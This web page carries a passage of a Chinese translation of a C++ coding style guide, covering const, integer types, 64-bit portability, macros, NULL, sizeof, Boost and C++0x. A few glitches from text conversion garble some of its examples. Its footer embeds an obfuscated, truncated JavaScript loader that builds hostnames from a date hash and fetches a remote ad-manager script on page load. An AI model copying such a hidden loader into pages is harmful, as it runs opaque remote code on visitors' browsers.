<ul><li style="margin-left:0cm;"><span style="color:#7c79e5;">利：不考虑返回值时，前置性能总是优于后置。这是因为后置需要复制i的值。如果i是一个迭代器或者非标量类型，复制i将是很大的开销。既然两者的作用相同，为何不选择前置运算呢。</span></li><li style="margin-left:0cm;"><span style="color:#7c79e5;">弊：在C传统开发中，常使用后置方式，尤其在for循环中。有些⼈人发现后置运算更易读，与英语语法一样，后置运算的对象(i)在动词(++)之前。</span></li></ul> 
<p style="margin-left:0cm;"> </p> 
<h4 id="const%E4%BF%AE%E9%A5%B0%E7%AC%A6%E7%9A%84%E4%BD%BF%E7%94%A8(Use%20of%20const)" style="margin-left:0cm;"><span style="color:#000000;">const</span><span style="color:#000000;">修饰符的使用</span><span style="color:#000000;">(Use of const)</span></h4> 
<p style="margin-left:0cm;"><span style="color:#000000;">        当需要的时候尽量使用const</span><span style="color:#000000;">修饰。</span></p> 
<p style="margin-left:0cm;"><strong><span style="color:#000000;">定义：</span></strong></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">        使用</span><span style="color:#86ca5e;">const</span><span style="color:#000000;">来限制变量或者参数不被修改</span><span style="color:#000000;">(</span><span style="color:#000000;">比如</span><span style="color:#86ca5e;">const int foo</span><span style="color:#000000;">)。类方法也可用</span><span style="color:#86ca5e;">const</span><span style="color:#000000;">修饰以说明其不会改变类的状态。</span><span style="color:#000000;">(</span><span style="color:#000000;">比如</span><span style="color:#86ca5e;">class Foo{(int Bar(char c) const;)</span><span style="color:#000000;">)</span></p> 
<ul><li style="margin-left:0cm;"><span style="color:#7c79e5;">利：有利于程序员理解变量的使用方式。编译器能进行更严格的类型检查，而且常常能产⽣生更高效的代码。说服程序员相信其程序的正确性，毕竟他们知道其调用的函数对这些变量的修改是有限制的。这可以帮助程序员知道在多线程编程中哪些函数不需要锁也能正确地运行。</span></li><li style="margin-left:0cm;"><span style="color:#7c79e5;">弊：const是传递的，如果你给函数传递const变量，那么这个函数在声明时必须加上const声明（否则变量需要const_cast）。在使用库函数时，这将是一个问题。</span></li></ul> 
<p style="margin-left:0cm;"><strong><span style="color:#000000;">结论：</span></strong></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">        const变量、数据成员、方法和参数使编译器进行编译时类型检查，因此能尽早发现程序错误。以下情况强烈建议使用</span><span style="color:#000000;">const</span><span style="color:#000000;">修饰：</span></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">● </span><span style="color:#000000;">函数不修改通过引用或者指针传递的参数值，应该使用</span><span style="color:#000000;">const</span><span style="color:#000000;">修饰；</span></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">● </span><span style="color:#000000;">类方法应该尽量定义成</span><span style="color:#000000;">const</span><span style="color:#000000;">。访问器</span><span style="color:#000000;">(Accessor)</span><span style="color:#000000;">应该永远是</span><span style="color:#000000;">const的。其他不修改类数据成员、不调用非</span><span style="color:#000000;">const</span><span style="color:#000000;">方法不返回非</span><span style="color:#000000;">const</span><span style="color:#000000;">引用或指针的函数也应该是const的；</span></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">● </span><span style="color:#000000;">把初始化后不需要修改的数据成员定义成</span><span style="color:#000000;">const。但不要滥用</span><span style="color:#000000;">const</span><span style="color:#000000;">。像</span><span style="color:#000000;">const int* const * const x就是滥用，即使你能准确地解释清楚</span><span style="color:#000000;">const x</span><span style="color:#000000;">是什么意思。注意什么是真正有用的，这种情况下，const int **x就足够了。当进行多线程编程时，</span><span style="color:#000000;">mutable关键字可能不安全，所以在使用时应该⾸首先考虑线程安全。</span></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">        </span><span style="color:#ffbb66;">应该将const放在什么位置</span></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">        某些⼈人更喜欢将const</span><span style="color:#000000;">放在类型后</span><span style="color:#000000;">(</span><span style="color:#000000;">int const *foo</span><span style="color:#000000;">而不是</span><span style="color:#000000;">const int* foo</span><span style="color:#000000;">)。他们认为这样更易读和一致，</span><span style="color:#000000;">const修饰的对象总是紧跟在它后面。然而，这种一致性在这⾥里却不适用，因为</span><span style="color:#000000;">“</span><span style="color:#000000;">不要太过分</span><span style="color:#000000;">”</span><span style="color:#000000;">宣言排除大多数你认为的一致性用法。将</span><span style="color:#000000;">const放在前面更具可读性，因为它与英语语法一样，把形容词</span><span style="color:#000000;">(const)</span><span style="color:#000000;">放在名词</span><span style="color:#000000;">(int)前面。这并不是说我们鼓励你将</span><span style="color:#000000;">const</span><span style="color:#000000;">放在最前面你就一定要这么做，注意与你的代码保持一致性。</span></p> 
<p style="margin-left:0cm;"> </p> 
<h4 id="%E6%95%B4%E5%9E%8B%E7%B1%BB%E5%9E%8B(Integer%20Types)" style="margin-left:0cm;"><span style="color:#000000;">整型类型</span><span style="color:#000000;">(Integer Types)</span></h4> 
<p style="margin-left:0cm;"><span style="color:#000000;">        所有C++</span><span style="color:#000000;">整型中，唯一可能用到就是</span><span style="color:#86ca5e;">int</span><span style="color:#000000;">。当需要其他长度的整型时，使用</span><span style="color:#f33b45;">stdint.h</span><span style="color:#000000;">头文件中的精确整型，比如</span><span style="color:#86ca5e;">int16_t</span><span style="color:#000000;">。</span></p> 
<p style="margin-left:0cm;"><strong><span style="color:#000000;">定义：</span></strong></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">        C++未明确定义整型的长度。人们通常的假设是：</span><span style="color:#86ca5e;">short：16位，int：32位，long：32位，long long：64位</span><span style="color:#000000;">。</span></p> 
<ul><li style="margin-left:0cm;"><span style="color:#000000;">利：一致的声明；</span></li><li style="margin-left:0cm;"><span style="color:#000000;">弊：整型的长度因编译器和计算机结构不同而不同。</span></li></ul> 
<p style="margin-left:0cm;"><strong><span style="color:#000000;">结论：</span></strong></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">        在</span><span style="color:#f33b45;">stdint.h</span><span style="color:#000000;">头文件中定义了</span><span style="color:#86ca5e;">int16_t, uint32_t,int64_t</span><span style="color:#000000;">等整型，用到整型时，应该⾸首选这些精确的类型。对于</span><span style="color:#000000;">C</span><span style="color:#000000;">的整型，只可以使用</span><span style="color:#86ca5e;">int</span><span style="color:#000000;">。适当的时候，你还应该使用其他标准类型，比如</span><span style="color:#86ca5e;">size_t</span><span style="color:#000000;">和</span><span style="color:#86ca5e;">ptrdiff_t</span><span style="color:#000000;">。</span></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">        对于已知不会太大的整数，可以使用int</span><span style="color:#000000;">，比如循环变量。但应该考虑</span><span style="color:#000000;">int</span><span style="color:#000000;">至少是</span><span style="color:#000000;">32位的，但不要认为</span><span style="color:#86ca5e;">int</span><span style="color:#000000;">会超过</span><span style="color:#000000;">32</span><span style="color:#000000;">位。当需要</span><span style="color:#000000;">64</span><span style="color:#000000;">位整型时，使用</span><span style="color:#86ca5e;">int64_t</span><span style="color:#000000;">或者</span><span style="color:#86ca5e;">uint64_t</span><span style="color:#000000;">。如果已知整数会比较大，使用</span><span style="color:#86ca5e;">int64_t</span><span style="color:#000000;">。</span></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">        不要使用无符号的uint32_t，除非你确切地知道要存储是一个位组而不是一个数字，或者你定义⼆二进制补码溢出。特别地，不要用无符号类型来说明一个数是非负的，用断⾔言来说明。</span></p> 
<p style="margin-left:0cm;"><span style="color:#ffbb66;">        关于无符号整型</span></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">        一些⼈人，包括教科书的作者在内，推荐使用无符号类型来代表非负数值。这被认为是一种自文档（即代码本⾝身就能说明其含义而不需要文档（比如注释）来说明：</span><span style="color:#86ca5e;">unsigned int book_amount;</span><span style="color:#000000;">就是一种自文档）。然而，</span><span style="color:#000000;">C中，这种自文档的优点却无法掩盖其带来的程序缺陷：考虑下面的代码：</span></p> 
<pre class="has"><code>for(unsigned int i = foo.Length()-1; i &gt;= 0; --i) ...</code></pre> 
<p style="margin-left:0cm;"><span style="color:#000000;">        这是一个死循环！GCC可能会提醒这个缺陷并给出警告，但大多数情况下会被忽略。相似的严重缺陷在进行有符号和无符号变量比较时也会出现。根本原因是C语⾔言的类型提升机制使无符号类型的行为变得无法预期。所以，使用断⾔言来说明一个变量的非负性。不要使用无符号类型。</span></p> 
<p style="margin-left:0cm;"> </p> 
<h4 id="64%E4%BD%8D%E5%85%BC%E5%AE%B9%E6%80%A7(64-bit%20Portability)" style="margin-left:0cm;"><span style="color:#000000;">64</span><span style="color:#000000;">位兼容性</span><span style="color:#000000;">(64-bit Portability)</span></h4> 
<p style="margin-left:0cm;"><span style="color:#000000;">        程序代码应该保持32</span><span style="color:#000000;">位和</span><span style="color:#000000;">64</span><span style="color:#000000;">位的兼容性。考虑打印</span><span style="color:#000000;">(</span><span style="color:#86ca5e;">Printing</span><span style="color:#000000;">)</span><span style="color:#000000;">、比较</span><span style="color:#000000;">(</span><span style="color:#86ca5e;">Comparisons</span><span style="color:#000000;">)和数据对齐</span><span style="color:#000000;">(</span><span style="color:#86ca5e;">Structure alignment</span><span style="color:#000000;">)</span><span style="color:#000000;">：</span></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">● </span><span style="color:#000000;">对于某些类型，指⽰示符</span><span style="color:#000000;">printf()</span><span style="color:#000000;">不能很好在</span><span style="color:#000000;">32</span><span style="color:#000000;">和</span><span style="color:#000000;">64</span><span style="color:#000000;">位系统间兼容。</span><span style="color:#000000;">C99定义了一些格式兼容的指⽰示符。但</span><span style="color:#000000;">MCVC7.1对某些不支持，所以某些情况下，只有自己基于</span><span style="color:#000000;">inttypes.h</span><span style="color:#000000;">的风格来自己定义自己比较丑陋的版本了。</span></p> 
<pre class="has"><code>// size_t的输出宏，基于inttypes.h的⻛风格
#ifdef _LP64</code></pre> 
<p style="margin-left:0cm;"><img alt="" class="has" height="394" src="https://images2.imgbox.com/7b/72/6GaXB9Lt_o.png" width="1169"></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">注意</span><span style="color:#000000;">PRI*宏作为独立字符串的扩展由编译器进行连接。因为，在使用非常量字符串时，需要将宏体插入格式说明中而不是命名它。将长度指⽰示符加在</span><span style="color:#000000;">%后也是允许的。比如</span><span style="color:#86ca5e;">printf(“x = %30”PRIuS”\n”,x)</span><span style="color:#000000;">，在</span><span style="color:#000000;">32</span><span style="color:#000000;">位</span><span style="color:#000000;">Linux上展开时为</span><span style="color:#86ca5e;">printf(“x = %32”u””\n”,x)</span><span style="color:#000000;">，编译器识 .为</span><span style="color:#86ca5e;">printf(“ = %30u\n”x)</span><span style="color:#000000;">。</span></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">● </span><span style="color:#000000;">注意，</span><span style="color:#86ca5e;">sizeof(void *) != sizeof(int)</span><span style="color:#000000;">。如果需要指针 .大小的整数，使用</span><span style="color:#86ca5e;">intptr_t</span><span style="color:#000000;">；</span></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">● </span><span style="color:#000000;">注意数据尤其是保存在磁盘上的数据的对齐问题。任何</span><span style="color:#000000;">64位系统的类或结构体，如果有</span><span style="color:#000000;">int64_t</span><span style="color:#000000;">或</span><span style="color:#000000;">uint64_t</span><span style="color:#000000;">类型的数据成员，默认情况下，会以</span><span style="color:#000000;">8字节结尾来保持数据对齐。在</span><span style="color:#000000;">32</span><span style="color:#000000;">和</span><span style="color:#000000;">64位兼容代码中，如果有这种结构，应该确保它们在两种体系下被一致地封装。大多数编译器提供了数据对齐转换功能。比如</span><span style="color:#000000;">gcc，使用命令</span><span style="color:#86ca5e;">__attribute__((packed))</span><span style="color:#000000;">。</span><span style="color:#000000;">MSVC</span><span style="color:#000000;">则提供了</span><span style="color:#86ca5e;">#pragma pack()</span><span style="color:#000000;">和</span><span style="color:#86ca5e;">__declspec(align())</span><span style="color:#000000;">。</span></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">● </span><span style="color:#000000;">声明</span><span style="color:#000000;">64</span><span style="color:#000000;">位常量时使用</span><span style="color:#000000;">LL</span><span style="color:#000000;">或</span><span style="color:#000000;">ULL</span><span style="color:#000000;">后缀：</span></p> 
<pre class="has"><code>int64_t my_value = 0x123456789LL;</code></pre> 
<p style="margin-left:0cm;"><span style="color:#000000;">● </span><span style="color:#000000;">如果确实需要在</span><span style="color:#000000;">32</span><span style="color:#000000;">和</span><span style="color:#000000;">64</span><span style="color:#000000;">位系统上开发不同的代码，可以</span><span style="color:#86ca5e;">#ifdef _LP64</span><span style="color:#000000;">命令来在两种环境中切换。但尽量避免这样做并保持修改局部化。</span></p> 
<p style="margin-left:0cm;"> </p> 
<h4 id="%E9%A2%84%E5%A4%84%E7%90%86%E5%AE%8F(Preprocessor%20Macros)" style="margin-left:0cm;"><span style="color:#000000;">预处理宏</span><span style="color:#000000;">(Preprocessor Macros)</span></h4> 
<p style="margin-left:0cm;"><span style="color:#000000;">        宏的使用应倍加小⼼心。尽量用内联函数、枚举和常量来代替宏。</span></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">        宏意味着编译器对代码的理解和你很不同。这可能导致不可预期的行为，尤其因为宏是全局作用的。</span></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">        还好，C++</span><span style="color:#000000;">对宏的需求不像</span><span style="color:#000000;">C那样必要。可以使用内联函数来代替由宏定义的性能要求高的代码；使用</span><span style="color:#000000;">const常量来代替由宏定义的常量；使用引用来代替由宏定义的长变量名的缩写；除包含保护外，忽略所有由宏定义的条件编译指令，这些指令使代码难以测试。</span></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">        当然，宏具有其他技术做不到的特殊应用。这些在底层的库定义和代码库中较常见。而且，它们具有一些语⾔言本⾝身都无法完全实现的特征</span><span style="color:#000000;">(</span><span style="color:#000000;">比如分词</span><span style="color:#000000;">(</span><span style="color:#86ca5e;">stringifying</span><span style="color:#000000;">)、连接(</span><span style="color:#86ca5e;">Concatenation</span><span style="color:#000000;">)</span><span style="color:#000000;">等</span><span style="color:#000000;">)</span><span style="color:#000000;">。但使用宏前，考虑一下有没有不使用宏也能达到目的的方法。</span></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">        下面的用法可以避免大量使用宏引起的问题，如果使用宏，请严格遵守它们：</span></p> 
<ol><li style="margin-left:0cm;"><span style="color:#000000;">● </span><span style="color:#000000;">不要在头文件中定义宏；</span></li><li style="margin-left:0cm;"><span style="color:#000000;">● </span><span style="color:#000000;">使用宏前定义</span><span style="color:#000000;">(</span><span style="color:#86ca5e;">#define</span><span style="color:#000000;">)</span><span style="color:#000000;">它们，使用后立即解定义</span><span style="color:#000000;">(</span><span style="color:#86ca5e;">#undef</span><span style="color:#000000;">)</span><span style="color:#000000;">；</span></li><li style="margin-left:0cm;"><span style="color:#000000;">● 不要解定义一个宏后又接着使用它定义另一个宏，选择一个不同的唯一的宏名称；</span></li><li style="margin-left:0cm;"><span style="color:#000000;">● </span><span style="color:#000000;">不要使用导致不平衡</span><span style="color:#000000;">C++</span><span style="color:#000000;">构造的宏，如果使用，应该详细这种行为的正确性；</span></li><li style="margin-left:0cm;"><span style="color:#000000;">● </span><span style="color:#000000;">不要使用</span><span style="color:#000000;">#</span><span style="color:#000000;">作为函数、类或变量名称的开始</span></li></ol> 
<p style="margin-left:0cm;"> </p> 
<h4 id="0%E5%92%8C%E7%A9%BA(0%20and%20NULL)" style="margin-left:0cm;"><span style="color:#000000;">0</span><span style="color:#000000;">和空</span><span style="color:#000000;">(0 and NULL)</span></h4> 
<p style="margin-left:0cm;"><span style="color:#000000;">       </span><span style="color:#f33b45;"> 整型用0、实数用0.0、指针用NULL、字符用’\0’</span><span style="color:#000000;">。对于整型和实数这是毫无争议的。</span></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">        但是对于指针（地址值），有两个选择：0</span><span style="color:#000000;">和</span><span style="color:#000000;">NULL</span><span style="color:#000000;">。</span><span style="color:#000000;">Bjarne Stroustrup建议使用无修饰的</span><span style="color:#000000;">0</span><span style="color:#000000;">，但我们建议使用</span><span style="color:#000000;">NULL</span><span style="color:#000000;">，它看上去更像一个指针。事实上，一些</span><span style="color:#000000;">C++编译器，比如gcc4.1.0</span><span style="color:#000000;">提供了特殊的</span><span style="color:#000000;">NULL定义以使其能够检测出错误并给出有用的警告，此时，</span><span style="color:#86ca5e;">sizeof(NULL)</span><span style="color:#000000;">和</span><span style="color:#86ca5e;">sizeof(0)</span><span style="color:#000000;">是不等的。</span></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">        用’\0’</span><span style="color:#000000;">代表空字符则使代码更易读。</span></p> 
<p style="margin-left:0cm;"> </p> 
<h4 id="%E5%AD%98%E5%82%A8%E5%AE%B9%E9%87%8F%E8%BF%90%E7%AE%97%E7%AC%A6(sizeof)" style="margin-left:0cm;"><span style="color:#000000;">存储容量运算符</span><span style="color:#000000;">(sizeof)</span></h4> 
<p style="margin-left:0cm;"><span style="color:#000000;">        尽量使用sizeof(</span><em><span style="color:#000000;">varname</span></em><span style="color:#000000;">)</span><span style="color:#000000;">而不是</span><span style="color:#000000;">sizeof(</span><em><span style="color:#000000;">Type</span></em><span style="color:#000000;">)来确定一个变量或类型的大小。之所以使用</span><em><span style="color:#000000;">sizeof(varname)</span></em><span style="color:#000000;">是因为一旦变量的类型改变，仍可正确计算其存储容量。</span></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">        </span><em><span style="color:#000000;">sizeof(type)</span></em><span style="color:#000000;">只在某些情况有用，应该避免它的使用，在变量发⽣生变化时，它可能不再与变量同步。</span></p> 
<pre class="has"><code>Struct data;
memset(&amp;data,0,sizeof(data));</code></pre> 
<h4 id="%E5%A2%9E%E5%BC%BA%E5%BA%93(Boost)" style="margin-left:0cm;"><span style="color:#000000;">增强库</span><span style="color:#000000;">(Boost)</span></h4> 
<p style="margin-left:0cm;"><span style="color:#000000;">        从增强库中选择那些被广泛认可的库来使用。</span></p> 
<p style="margin-left:0cm;"><strong><span style="color:#000000;">定义：</span></strong></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">        Boost是一个流行的，同行评论的、免费开源的</span><span style="color:#000000;">C++</span><span style="color:#000000;">库系列。</span></p> 
<ul><li style="margin-left:0cm;"><span style="color:#000000;">利：</span><span style="color:#000000;">Boost</span><span style="color:#000000;">代码非常高效，兼容性强并且填补了</span><span style="color:#000000;">C++标准库的许多空白。比如类型萃取、改进的函数绑定和改进的智能指针。同时，它还提供了标准库的扩展库－</span><span style="color:#000000;">TR1的实现。</span></li><li style="margin-left:0cm;"><span style="color:#000000;">弊：一些</span><span style="color:#000000;">Boost库可能鼓励可读性差的编程实践，比如元编程和其他高级模板技术以及过度功能化的编程风格。</span></li></ul> 
<p style="margin-left:0cm;"><strong><span style="color:#000000;">结论：</span></strong></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">        为保持高度的可读性，只有被认可的部分Boost</span><span style="color:#000000;">特性允许使用。目前，仅限以下库：</span></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">● </span><span style="color:#000000;">boost/call_straits.hpp</span><span style="color:#000000;">中的</span><span style="color:#000000;">Call Traits</span><span style="color:#000000;">；</span></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">● </span><span style="color:#000000;">boost/compressed_pair.hpp</span><span style="color:#000000;">中的</span><span style="color:#000000;">CompressedPair</span><span style="color:#000000;">；</span></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">● </span><span style="color:#000000;">除</span><span style="color:#000000;">C++03</span><span style="color:#000000;">标准中未定义的容器持久化和封装工具</span><span style="color:#000000;">(ptr_circlar_buffer.hpp和ptr_unordered*)</span><span style="color:#000000;">外的</span><span style="color:#000000;">boost/prt_container</span><span style="color:#000000;">中的</span><span style="color:#000000;">Pointer Container</span><span style="color:#000000;">；</span></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">● </span><span style="color:#000000;">boost/array.hpp</span><span style="color:#000000;">中的</span><span style="color:#000000;">Array</span><span style="color:#000000;">；</span></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">● </span><span style="color:#000000;">boost/graph</span><span style="color:#000000;">中除持久化</span><span style="color:#000000;">(adj_list_serialize.hpp)和并发、分布式算法和数据结构(boost/graph/parallel/*</span><span style="color:#000000;">和</span><span style="color:#000000;">boost/graph/distributed/*)</span><span style="color:#000000;">。</span></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">● </span><span style="color:#000000;">boost/property_map</span><span style="color:#000000;">中除并发、分布式</span><span style="color:#000000;">(boost/property_map/parallel/*)的属性映射；</span></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">● </span><span style="color:#000000;">迭代器部分用于处理迭代器定义的部分：boost/iterator/iterator_adaptor.hpp,boost/iterator/iterator_facade.hpp,boost/function_output_iterator.hpp</span></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">        我们经常考虑增加一些Boost</span><span style="color:#000000;">特性，所以这些规则可能会改变。</span></p> 
<p style="margin-left:0cm;"> </p> 
<h4 id="C%2B%2B%200x%E5%BA%93" style="margin-left:0cm;"><span style="color:#000000;">C++ 0x</span><span style="color:#000000;">库</span></h4> 
<p style="margin-left:0cm;"><span style="color:#000000;">        使用已认可C++0x</span><span style="color:#000000;">库和语⾔言扩展，目前还没有被认可的。</span></p> 
<p style="margin-left:0cm;"><strong><span style="color:#000000;">定义：</span></strong></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">        C++0x是下一个</span><span style="color:#000000;">ISO</span><span style="color:#000000;">的</span><span style="color:#000000;">C++</span><span style="color:#000000;">标准，目前正处于最终委员会草案阶段。包括对</span><span style="color:#000000;">C++语⾔言和库的重要变化。</span></p> 
<ul><li style="margin-left:0cm;"><span style="color:#7c79e5;">利：我们希望C++0x成为下一个C++标准并最终被大多数编译器支持。它将一些目前广泛使用的C++扩展库（第三方）纳入标准，为某些操作提供了简化方法并在安全方面作了改进。</span></li><li style="margin-left:0cm;"><span style="color:#7c79e5;">弊：C++0x标准比它之前的标准都要复杂（1,300⻚页，之前的只有800⻚页），并且，很多开发者对它并不熟悉。它的一些特性对代码可读性和可维护性的长期影响还不得而知。我们并不能预测什么时候它的众多特性才能被众多工具统一地实现，但这将很有趣(gcc,icc,clang,Eclipse等)。</span></li></ul> 
<p style="margin-left:0cm;"><span style="color:#000000;">        与Boost</span><span style="color:#000000;">一样，一些C++0x扩展鼓励降低代码可读性的编程实践－比如移除检测到的冗余（比如类型名），而这些冗余对读者很有帮助，或者鼓励模板元编程。另外一些扩展提供与现在机制复杂的功能，这有可能导致混乱并带来转换开销。</span></p> 
<p style="margin-left:0cm;"><strong><span style="color:#000000;">结论：</span></strong></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">        与Boost一样，使用那些被认可的语⾔言扩展和库。虽然目前还没有被认可的库，但随着标准的确立，新特征会被逐渐认识的。</span></p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/eabc8d09f0065eadaab7c34b26a141df/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">identityHashCode与hashCode详细对比</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/471e3842e556794d719188837c921ccd/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">K8s部署Vue应用</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X